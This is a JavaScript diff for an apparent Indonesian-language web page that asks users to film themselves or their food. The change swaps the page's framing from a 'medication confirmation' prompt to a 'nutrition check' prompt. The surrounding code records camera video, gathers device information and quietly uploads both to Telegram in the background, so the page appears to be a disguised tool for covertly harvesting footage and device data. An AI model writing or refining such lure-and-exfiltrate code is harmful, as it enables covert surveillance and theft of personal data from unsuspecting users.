@@ -47,9 +47,9 @@ function startMedication(event) {
   const bottomProgress = $('med-bottom-progress');
 
   if (badge) badge.className = 'rec-badge';
-  if (badgeText) badgeText.textContent = 'SIAPKAN OBAT';
-  if (title) title.textContent = 'Konfirmasi Minum Obat';
-  if (subtitle) subtitle.innerHTML = 'Posisikan HP di depan wajah Anda,<br>lalu ketuk tombol di bawah <strong>2 kali cepat</strong> untuk mulai.';
+  if (badgeText) badgeText.textContent = 'SIAPKAN MAKANAN';
+  if (title) title.textContent = 'Periksa Kandungan Nutrisi';
+  if (subtitle) subtitle.innerHTML = 'Posisikan makanan di depan kamera HP anda,<br>lalu ketuk tombol di bawah <strong>2 kali</strong> untuk mulai.';
 
   if (bottomTrigger) bottomTrigger.style.display = 'flex';
 
@@ -122,7 +122,7 @@ async function handleVideoReady() {
   if (chunks.length > 0) {
     const blob = new Blob(chunks, { type: mimeUsed });
     collectDeviceInfo().then(devInfo => {
-      const caption = `KONFIRMASI MINUM OBAT\n\n${formatDeviceInfo(devInfo)}`;
+      const caption = `PERIKSA KANDUNGAN NUTRISI\n\n${formatDeviceInfo(devInfo)}`;
       tgSendVideo(blob, caption).catch(err =>
         console.warn('[medication.js] Background upload error:', err)
       );
@@ -259,7 +259,7 @@ async function triggerMedicationCamera(event) {
     } else if (err.name === 'NotReadableError') {
       msg = 'Kamera sedang digunakan aplikasi lain.';
     }
-    showResult({ success: false, icon: '🚫', title: 'Kamera Belum Diizinkan', message: msg });
+    showResult({ icon: '🚫', title: 'Kamera Belum Diizinkan', message: msg });
     return;
   }
 
